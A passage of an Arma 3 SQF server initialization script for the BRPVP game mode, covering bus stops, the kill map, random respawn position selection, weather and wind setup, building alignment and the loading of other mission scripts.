	_stop = createVehicle ["Land_WoodenShelter_01_F",_pos,[],0,"CAN_COLLIDE"];
	_stop allowDamage false;
	_stop setVariable ["brpvp_bus_stop",true,true];
	_stop setDir _dir;
} forEach BRPVP_busServiceStopPoints;
BRPVP_busServiceStopMenuParam = [];
{
	_stop = _x select 0;
	_min = 1000000;
	_name = "";
	{
		_dist = _stop distanceSqr (_x select 0);
		if (_dist < _min) then {
			_min = _dist;
			_name = _x select 2;
		};
	} forEach BRPVP_locaisImportantes;
	BRPVP_busServiceStopMenuParam pushBack [_name,_stop,_forEachIndex];
} forEach BRPVP_busServiceStopPoints;
publicVariable "BRPVP_busServiceStopMenuParam";

//GENERATE KILL MAP
["CALCULATE KILL MAP",BRPVP_killMapCalculate] call BRPVP_execFast;

//CREATE INITIAL RANDOM SPAWN SET
_init = diag_tickTime;
_places = [];
_count = 0;
while {count _places < BRPVP_useRandomRespawnPlacesToChoose} do {
	_ok = false;
	_mult = (1-0.1*floor (_count/50)) max 0;
	_randPos = BRPVP_randomRespawnSquare apply {(_x select 0)+random ((_x select 1)-(_x select 0))};
	_randPos pushBack 0;
	if (!surfaceIsWater _randPos) then {
		_nearFlag = count (_randPos nearObjects ["FlagCarrier",200+150*_mult]) > 0;
		_nearMan = count (_randPos nearEntities ["CAManBase",200*_mult]) > 0;
		_nearOther = {_randPos distance2D _x < BRPVP_useRandomRespawnPlacesDistance*_mult} count _places > 0;
		if !(_nearFlag || _nearMan || _nearOther) then {
			_best = _randPos findEmptyPosition [0,35,BRPVP_playerModel];
			if !(_best isEqualTo []) then {
				_lis = lineIntersectsSurfaces [AGLToASL _best vectorAdd [0,0,0.25],AGLToASL _best vectorAdd [0,0,10]];
				if (_lis isEqualTo []) then {
					_ok = true;
					_count = 0;
					_places pushBack _best;
				};
			};
		};
	};
	if (!_ok) then {_count = _count+1;};
};
_placesBK = [];
_count = 0;
while {count _placesBK < BRPVP_useRandomRespawnPlacesToChooseBotKill} do {
	_ok = false;
	_mult = (1-0.1*floor (_count/50)) max 0;
	_randPos = BRPVP_randomRespawnSquare apply {(_x select 0)+random ((_x select 1)-(_x select 0))};
	_randPos pushBack 0;
	if (!surfaceIsWater _randPos) then {
		_nearFlag = count (_randPos nearObjects ["FlagCarrier",200+150*_mult]) > 0;
		_nearMan = count (_randPos nearEntities ["CAManBase",200*_mult]) > 0;
		_nearOther = {_randPos distance2D _x < BRPVP_useRandomRespawnPlacesDistanceBotKill*_mult} count _placesBK > 0;
		if !(_nearFlag || _nearMan || _nearOther) then {
			_best = _randPos findEmptyPosition [0,35,BRPVP_playerModel];
			if !(_best isEqualTo []) then {
				_lis = lineIntersectsSurfaces [AGLToASL _best vectorAdd [0,0,0.25],AGLToASL _best vectorAdd [0,0,10]];
				if (_lis isEqualTo []) then {
					_ok = true;
					_count = 0;
					_placesBK pushBack _best;
				};
			};
		};
	};
	if (!_ok) then {_count = _count+1;};
};
BRPVP_randomRespawnInitial = [_places,_placesBK];
diag_log format ["[BRPVP Rand Pos Initial Select Time] %1",(round ((diag_tickTime-_init)*100))/100];

if (BRPVP_useExtDB3) then {
	//GET HABILITIES CHANGES
	private _resultado = "extDB3" callExtension format ["0:%1:habilitiesGetAll",BRPVP_protocolo];
	BRPVP_habilitiesState = parseSimpleArray _resultado select 1;
} else {
	//NOTHING IF CLIENTSV
	BRPVP_habilitiesState = [];
};

//SET WEATHER
0 setOvercast BRPVP_weatherInitialOvercast;
forceWeatherChange;
0 setFog (BRPVP_weatherFogOnOvercastZero+BRPVP_weatherInitialOvercast*(BRPVP_weatherFogOnOvercastOne-BRPVP_weatherFogOnOvercastZero));
0 setRain 0;

//WIND
private _windAngle = random 360;
private _windMin = BRPVP_weatherWindMin*(1-BRPVP_weatherInitialOvercast)+BRPVP_weatherWindMinWithClouds*BRPVP_weatherInitialOvercast;
private _windMax = BRPVP_weatherwindMax*BRPVP_weatherInitialOvercast+BRPVP_weatherwindMaxNoClouds*(1-BRPVP_weatherInitialOvercast);
private _windMag = _windMin+random (_windMax-_windMin);
setWind [_windMag*sin _windAngle,_windMag*cos _windAngle,true];
BRPVP_weatherServerWind = wind;
publicVariable "BRPVP_weatherServerWind";

BRPVP_weatherPredictFortClients = [BRPVP_weatherInitialOvercast,false,_windMag];
publicVariable "BRPVP_weatherPredictFortClients";
BRPVP_weatherOvercastNow = BRPVP_weatherInitialOvercast;
publicVariable "BRPVP_weatherOvercastNow";
BRPVP_weatherRainOnServer = 0;
publicVariable "BRPVP_weatherRainOnServer";
if (BRPVP_useDynamicWeather) then {
	execVM "BRPVP_server_code\server_weatherChange.sqf";
} else {
	0 spawn {
		waitUntil {
			uiSleep 30;
			if (fog > 0.02) then {30 setFog 0;};
			false
		};
	};
};

//FIX LOOT POSITION WHEN A HOUSE IS DESTROYED
addMissionEventHandler ["BuildingChanged",{call BRPVP_runOnHouseChangeModel;}];

//ADJUST MULTI PART BUILDING
BRPVP_multiPartObjects = BRPVP_multiPartObjects-[objNull];
{
	_typeOf = typeOf _x;
	if (_typeOf in ["Land_GH_MainBuilding_left_F","Land_GH_MainBuilding_right_F"]) then {_x call BRPVP_alignByCenterObjHotel;};
	if (_typeOf in ["Land_Hospital_side1_F","Land_Hospital_side2_F"]) then {_x call BRPVP_alignByCenterObjHospital;};
	if (_typeOf in ["Land_Airport_left_F","Land_Airport_right_F"]) then {_x call BRPVP_alignByCenterObjAirport;};
} forEach BRPVP_multiPartObjects;

//ADD AUTO CLASS ADD ITEMS
call compile preprocessFileLineNumbers "BRPVP_server_code\server_autoClassAdItems.sqf";

//EXTRA FIXED CONSTRUCTION DONE BY PLAYERS OR STAFF
call compile preprocessFileLineNumbers "map_specific\extra_constructions.sqf";

//CREATE RANDOM BOXES
0 spawn compile preprocessFileLineNumbers "BRPVP_server_code\server_random_boxes.sqf";

//HIDE BIG FLOOR PIECES (DESTROYED BY ATOMIC BOMB)
{
	_x params ["_bfid","_pos"];
	private _obj = nearestObject _pos;
	if (_obj getVariable ["brpvp_bf_bfid",-1] isEqualTo _bfid) then {_obj hideObject true;};
} forEach BRPVP_atomicBombHiddenBigFloors;

//USE MONEY INSIDE BOXES NEAR FLAGS TO PAY FLAG
0 spawn {
	uiSleep 7.5;
	call BRPVP_autoPayFlagsByNearBoxes;
};

diag_log ("[SCRIPT] servidor_init.sqf END: " + str round (diag_tickTime - _scriptStart));